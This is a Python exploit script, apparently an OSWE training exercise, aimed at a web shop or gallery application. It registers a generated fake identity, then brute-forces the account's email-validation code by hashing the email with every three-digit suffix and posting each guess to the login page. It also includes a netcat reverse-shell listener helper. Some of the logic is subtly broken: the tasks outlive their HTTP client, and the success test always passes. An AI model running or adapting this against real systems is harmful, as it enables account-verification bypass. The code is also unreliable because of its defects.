import argparse
import httpx
import sys
import json
import shutil
import subprocess
import time
import random
import hashlib
import asyncio

from bs4 import BeautifulSoup
from pathlib import Path
from dataclasses import dataclass, asdict, field
from typing import Optional, Literal, Callable, TypedDict, Any
from concurrent.futures import ThreadPoolExecutor

root_dir = Path(__file__).resolve().parent.parent
sys.path.append(str(root_dir))

# If commomn isn't in ../../common, change root dir or change the imports as appropriate
from common.offsec_logger import OffsecLogger
from common.file_transfer_server import FileTransferServer
from common.IdentityGenerator.identity_generator import IdentityGenerator
from common.IdentityGenerator.specs.identity_spec import IdentitySpec

logger = OffsecLogger(logfile="gallery.log", debug=True)
ARTIFACT_DIR = Path("artifacts")

Identity = dict[str, Any]

CHARSETS = {
    "alpha": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "alnum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "hex": "0123456789abcdef",
    "ascii": "".join(chr(i) for i in range(32, 127)),  # printable ASCII
    "symbols": "!@#$%^&*()-_=+[{]}\\|;:'\",<.>/?`~",
    "base64": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=",
    "numeric": "0123456789",
}


@dataclass
class ExploitContext:
    target_ip: str
    target_port: str
    attacker_ip: str
    attacker_port: str
    protocol: str = "http"

    # Auth state
    token: Optional[str] = None
    token_name: Optional[str] = None
    session_cookie: Optional[str] = None

    # Metadata
    vuln_name: Optional[str] = None
    poc_id: Optional[str] = None
    notes: str = ""

    # Runtime fields (ignored in serialization)
    output_path: Path = field(
        default_factory=lambda: Path("exploit_context.json"), repr=False
    )

    def __post_init__(self):
        if isinstance(self.output_path, str):
            self.output_path = Path(self.output_path)

    def target_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def attacker_url(self) -> str:
        return f"{self.protocol}://{self.attacker_ip}:{self.attacker_port}"

    def save(self) -> None:
        """Persist context to a JSON file (excluding runtime fields)."""
        serializable_dict = {
            k: str(v) if isinstance(v, Path) else v
            for k, v in asdict(self).items()
            if k != "output_path"
        }
        with self.output_path.open("w") as f:
            json.dump(serializable_dict, f, indent=2)

    def load(self) -> None:
        """Restore fields from saved file if exists."""
        if self.output_path.exists():
            with self.output_path.open() as f:
                data = json.load(f)
            for key, value in data.items():
                if key == "output_path":
                    setattr(self, key, Path(value))
                else:
                    setattr(self, key, value)


async def get_csrf_async(client: httpx.AsyncClient, url: str) -> str | None:
    response = await client.get(url)
    if response.status_code != 200:
        logger.error(f"Failed to access dashboard: {response.status_code}")
        return None

    soup = BeautifulSoup(response.text, "html.parser")
    csrf = soup.find("input", {"name": "_csrf"})
    return csrf["value"] if csrf else None


def generate_validation_codes(ctx: ExploitContext, user: Identity) -> list[str]:
    numbers = [f"{_:03d}" for _ in range(1000)]
    return [
        hashlib.md5((user["email"] + number).encode()).hexdigest() for number in numbers
    ]


async def try_single_code(
    client: httpx.AsyncClient,
    url: str,
    user: Identity,
    csrf_token: str,
    validation_code: str,
) -> str | None:
    data = {
        "cust_email": user["email"],
        "cust_password": user["password"],
        "cust_validation_code": validation_code,
        "_csrf": csrf_token,
        "form1": "Submit",
    }

    resp = await client.post(url, data=data)

    if "Email Address does not match." not in resp.text.lower():  # adjust as needed
        logger.success(f"Code found: {validation_code}")
        return validation_code
    return None


async def try_all_codes(ctx: ExploitContext, user: Identity, validation_codes: list):
    url = f"{ctx.target_url()}/login.php"
    client = httpx.AsyncClient()

    csrf_token = await get_csrf_async(client, url)
    if csrf_token is None:
        logger.error("Failed to extract _csrf token")
        raise ValueError(f"CSRF token not found in page {url}")

    async with httpx.AsyncClient(follow_redirects=True) as client:
        tasks = [
            try_single_code(client, url, user, csrf_token, code)
            for code in validation_codes
        ]

    for task in asyncio.as_completed(tasks):
        result = await task
        if result is not None:
            return result

    logger.error("No valid code found")
    return None


def str2bool(v: str) -> bool:
    return v.lower() in ("yes", "true", "1")


def spawn_external_listener(listening_port: int):
    cmd = f"bash -c 'nc -lvnp {listening_port}; echo Press enter to close; read'"
    if shutil.which("gnome-terminal"):
        subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd])
    elif shutil.which("x-terminal-emulator"):
        subprocess.Popen(["x-terminal-emulator", "-e", cmd])
    else:
        print(f"[!] No terminal available. Run manually:\n{cmd}")


def register_user(ctx: ExploitContext, user: Identity):
    url = f"{ctx.target_url()}/registration.php"
    client = httpx.Client()

    csrf_token = get_csrf(client, url)
    if csrf_token is None:
        logger.error(f"Failed to extract _csrf token")
        raise ValueError(f"CSRF token not found in page {url}")

    form_data = {
        "_csrf": csrf_token,
        "cust_name": f"{user['first_name']} {user['last_name']}",
        "cust_cname": "ACME Corp",  # Optional / fake company
        "cust_email": user["email"],
        "cust_phone": user["phone"],
        "cust_address": user["address"]["street"],
        "cust_country": "230",  # United States (option value in <select>)
        "cust_city": user["address"]["city"],
        "cust_state": user["address"]["state"],
        "cust_zip": user["address"]["zip"],
        "cust_password": user["password"],
        "cust_re_password": user["password"],
        "form1": "Register",
    }

    response = client.post(url, data=form_data)

    if response.status_code != 200:
        logger.error(f"Unable to register user: {response.text}")
        raise ValueError(f"User Registration Failed: {response.status_code}")


def get_csrf(client: httpx.Client, url: str) -> str | None:
    response = client.get(url)
    if response.status_code != 200:
        logger.error(f"Failed to access dashboard: {response.status_code}")
        return None

    soup = BeautifulSoup(response.text, "html.parser")
    csrf = soup.find("input", {"name": "_csrf"})
    return csrf["value"] if csrf else None


def parse_args():
    parser = argparse.ArgumentParser(description="OSWE Chat Application Exploit.")

    parser.add_argument("--target-ip", type=str, required=True, help="Input file path")
    parser.add_argument("--target-port", type=int, default=80, help="Input file path")
    parser.add_argument(
        "--listening-port",
        type=int,
        default=9001,
        help="Port to listen for reverse shell (default: 9001)",
    )
    parser.add_argument(
        "--listening-ip",
        type=str,
        default="127.0.0.1",
        help="IP to listen on for reverse shell (default: 127.0.0.1)",
    )
    parser.add_argument(
        "--delay",
        type=int,
        default=3,
        help="Response delay in seconds for timing inference",
    )
    parser.add_argument(
        "--user-file", type=str, default="user.json", help="Existing exploit user"
    )
    parser.add_argument(
        "--register",
        type=str2bool,
        default=False,
        help="Has the user already been registered.",
    )
    # parser.add_argument(
    #     "--charset",
    #     choices=CHARSETS.keys(),
    #     default="alnum",
    #     help="Charset to use for blind SQLi password extraction.",
    # )
    parser.add_argument(
        "--complexity", choices=["low", "medium", "high"], help="Password complexity"
    )
    parser.add_argument(
        "--include-address", action="store_true", help="Include street address"
    )
    parser.add_argument(
        "--include-phone", action="store_true", help="Include phone number"
    )
    parser.add_argument("--save-file", help="Path to save generated identity JSON")
    parser.add_argument(
        "--proxy", default=None, help="Turn on Burp Suite proxy for debugging."
    )
    return parser.parse_args()


async def main():
    args = parse_args()
    Path(ARTIFACT_DIR).mkdir(parents=True, exist_ok=True)

    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

    if args.proxy:
        proxies = {"http": args.proxy, "https": args.proxy}
    else:
        proxies = None

    # charset = CHARSETS[args.charset]

    ctx = ExploitContext(
        target_ip=args.target_ip,
        target_port=args.target_port,
        attacker_ip=args.listening_ip,
        attacker_port=args.listening_port,
        protocol="http",
        vuln_name="Gallery",
        poc_id="01",
    )

    extras = []
    if args.include_address:
        extras.append("address")
    if args.include_phone:
        extras.append("phone")

    overrides = {}
    if args.complexity:
        overrides["password"] = {"complexity": args.complexity}

    spec = IdentitySpec(
        extras=extras,
        overrides=overrides,
    )

    generator = IdentityGenerator()
    identity = generator.generate_identity(spec)

    if args.save_file:
        generator.save_identity(ARTIFACT_DIR / args.save_file)
        logger.info(f"Identity saved to {ARTIFACT_DIR / args.save_file}")
    else:
        print(generator.as_json())

    register_user(ctx, identity)
    found_code = await try_all_codes(
        ctx, identity, validation_codes=generate_validation_codes(ctx, identity)
    )
    if found_code:
        print(f"[+] Valid code: {found_code}")
    else:
        print("[-] Failed to find a valid code")

    ctx.save()


if __name__ == "__main__":
    asyncio.run(main())
